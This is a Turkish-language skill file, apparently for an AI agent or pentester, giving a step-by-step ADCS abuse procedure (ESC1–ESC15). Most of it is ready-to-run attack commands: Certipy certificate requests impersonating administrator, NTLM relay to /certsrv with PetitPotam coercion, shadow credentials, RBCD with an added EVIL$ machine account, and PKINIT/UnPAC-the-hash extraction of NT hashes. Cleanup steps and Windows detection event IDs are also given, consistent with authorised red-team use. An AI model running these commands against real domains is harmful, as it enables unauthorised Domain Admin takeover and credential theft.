---
name: adcs-abuse
description: Active Directory Certificate Services istismarı: Certipy ile ESC1-ESC15 taraması, template/CA abuse, relay, PKINIT, shadow credentials ve RBCD ile domain privilege escalation ve kanıtı.
---
# ADCS Abuse (ESC1–ESC15)

## Amaç
AD Certificate Services yanlış yapılandırmalarını kullanarak kullanıcı → Domain Admin zincirini kurmak ve **kanıtlamak**. On-prem keşif için `ad-enumeration`, Kerberos/relay için `impacket`/`Responder` kullan.

## Hazırlık
```bash
pipx install certipy-ad
# alternatif: git clone https://github.com/ly4k/Certipy && pip install .
```
Gerekli: domain, bir domain kullanıcısı (varsa), DC IP, CA adı. LDAP imzası/kanal bağlama durumunu not et.

## 1) Tarama
```bash
certipy find -u '<user>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
certipy find -u '<user>' -p '<pass>' -dc-ip <DC> -bloodhound   # graf için
```
Çıktıyı sakla (`-json`/`-stdout`), her bulgu için template adı, `Enrollment Rights`, `Client Authentication`, `Enrollee Supplies Subject`, `EDITF_ATTRIBUTESUBJECTALTNAME2`, `Manager Approval`, `Authorized Signatures` alanlarını kaydet.

## 2) ESC sınıfları ve exploit
- **ESC1** — template `ENROLLEE_SUPPLIES_SUBJECT` + client auth + düşük enrollment hakkı:
```bash
certipy req -u '<user>' -p '<pass>' -ca '<CA>' -template '<T>' -upn administrator@corp.local -dc-ip <DC>
```
- **ESC2** — Any Purpose / SubCA EKU → aynı şekilde istenip TGT/kiminlik doğrulama için kullanılır.
- **ESC3** — Enrollment Agent template: `certipy req -template '<EA>'` → vekil sertifikayla başkası adına istek (`-on-behalf-of`).
- **ESC4** — template ACL'i yazılabilir: template'i ESC1'e çevir, exploit et, **orijinaline geri döndür**:
```bash
certipy template -u '<user>' -p '<pass>' -template '<T>' -save-old
certipy req ... ; certipy template ... -restore
```
- **ESC6** — CA'da `EDITF_ATTRIBUTESUBJECTALTNAME2` → herhangi template ile `-upn`.
- **ESC7** — CA'da `ManageCA`/`ManageCertificates`: officer ekle, pending isteği onayla (`certipy ca -add-officer`, `-issue-request`).
- **ESC8** — HTTP enrollment (`/certsrv`) NTLM relay: `ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template '<T>'` + `Responder`/coercion (`PetitPotam`).
- **ESC9/10** — `szOID_NTDS_CA_SECURITY_EXT` yokluğu / strong binding yokluğu → başka hesabın UPN'i ile sertifika.
- **ESC11** — ICPR RPC relay (`ntlmrelayx` `--rpc`), ESC13 — issuance policy → grup üyeliği, ESC14 — explicit altSecID, ESC15 — v1 template `schemaVersion 1` + `Application Policies`.
Her bulgu için: istenen sertifika, hangi hesapla, hangi yetkiyi verdi, geri alınabilir mi.

## 3) Sertifikadan kimlik bilgisi
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC>            # TGT + NT hash (UnPAC-the-hash)
# alternatif
gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip <DC> corp.local/administrator adm.ccache
getnthash.py -key <AS-REP key> corp.local/administrator
```

## 4) Yan zincirler
- **Shadow Credentials** (msDS-KeyCredentialLink yazma hakkı):
```bash
certipy shadow auto -u '<user>' -p '<pass>' -account <target> -dc-ip <DC>
```
Temizlik: `certipy shadow clear -account <target>`.
- **RBCD** (msDS-AllowedToActOnBehalfOfOtherIdentity):
```bash
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss123' corp.local/<user>:<pass> -dc-ip <DC>
rbcd.py -delegate-from 'EVIL$' -delegate-to '<TARGET$>' -action write corp.local/<user>:<pass> -dc-ip <DC>
getST.py -spn cifs/<TARGET> -impersonate administrator corp.local/'EVIL$':'P@ss123' -dc-ip <DC>
```
Temizlik: RBCD attribute'unu boşalt, oluşturulan computer hesabını sil.

## 5) Impact kanıtı
Seçilen yolu gerçekten tamamla: DA eşdeğeri erişimle **tek** kanıt nesnesi al — örn. `secretsdump.py -just-dc-user administrator` yerine yetki kanıtı olarak yalnız `nxc smb <DC> -u administrator -H <hash>` ile "Pwn3d!" ve tek bir LDAP okuma. Kanıt L3/L4; **tüm NTDS dump edilmez**, kanıt nesnesi maskelenir.

## 6) Temizlik
- İstenen/oluşturulan sertifikaları iptal sil (`certipy ca -revoke`), template değişikliklerini `-restore`/`-save-old` ile geri al, eklenen CA officer'ı kaldır.
- Shadow credential'ları sil, RBCD'yi boşalt, oluşturulan computer/`krbtgt` etkisi varsa rapora yaz.
- Her artefakt için "önce/sonra" durumunu kaydet.

## Tespit hook'ları
4886/4887 (sertifika istek/onay), 4888, 4768 (PKINIT), 4769 (servis bileti), CA audit, `/certsrv` erişimi, `msDS-KeyCredentialLink` ve `msDS-AllowedToActOnBehalfOfOtherIdentity` değişiklikleri (5136).

## Tuzaklar
NTLM tamamen kapalıysa ESC8/relay çalışmaz; EPA (Extended Protection) relay'i keser; strong certificate binding güncellemesi ESC9/10'u kapatır; template `Manager Approval` ise ESC1 tek başına yetmez (ESC7 ile birleştir).
